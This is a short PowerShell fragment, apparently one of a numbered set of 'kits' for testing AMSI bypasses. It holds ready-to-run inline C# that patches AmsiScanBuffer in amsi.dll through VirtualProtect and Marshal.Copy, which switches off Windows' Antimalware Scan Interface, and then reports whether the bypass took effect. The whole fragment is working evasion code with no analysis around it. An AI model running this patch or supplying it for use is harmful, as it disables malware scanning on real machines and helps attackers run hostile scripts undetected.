# --- KIT #3: The M16 ---
Write-Host "[TESTING] Kit #3: The M16 (Classic Full Patch)..."
$BypassSuccess = $false
try {
    $M16Patch=@"
    using System; using System.Runtime.InteropServices;
    public class P {[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string m);[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Patch(){IntPtr h=GetModuleHandle("amsi.dll");IntPtr a=GetProcAddress(h,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);byte[]p={0x31,0xC0,0xC3};Marshal.Copy(p,0,a,p.Length);}}
"@
    Add-Type -TypeDefinition $M16Patch; [P]::Patch()
    try { [System.Management.Automation.AmsiUtils]::ScanContent('amsiutils', 'Script') | Out-Null; $BypassSuccess = $true } catch {}
} catch {}

if ($BypassSuccess) {
    Write-Host "[SUCCESS] Test #3: The M16 is effective." -ForegroundColor Green
} else {
    Write-Host "[FAILED] Test #3: The M16 was ineffective or blocked." -ForegroundColor Red
}
